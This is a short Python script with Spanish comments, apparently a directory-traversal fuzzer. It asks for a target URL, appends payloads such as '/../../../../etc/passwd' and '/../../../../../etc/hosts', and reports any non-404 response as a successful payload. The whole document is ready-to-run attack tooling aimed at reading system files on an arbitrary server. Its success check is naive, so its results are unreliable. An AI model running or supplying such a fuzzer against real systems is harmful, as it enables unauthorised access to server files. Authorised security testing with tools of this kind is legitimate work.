import requests

def fuzz(url, payloads):
    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url)
            if response.status_code != 404:
                print(f"Payload exitoso: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Error al enviar solicitud: {e}")

# Ejemplo de uso
if __name__ == "__main__":
    target_url = input("Introduce la URL objetivo: ")
    payloads = [
        "/../../",
        "/../../../",
        "/../../../../etc/passwd",
        "/../../../../../etc/passwd",
        "/../../../../../etc/hosts",
        # Agrega más payloads según tus necesidades
    ]
    fuzz(target_url, payloads)
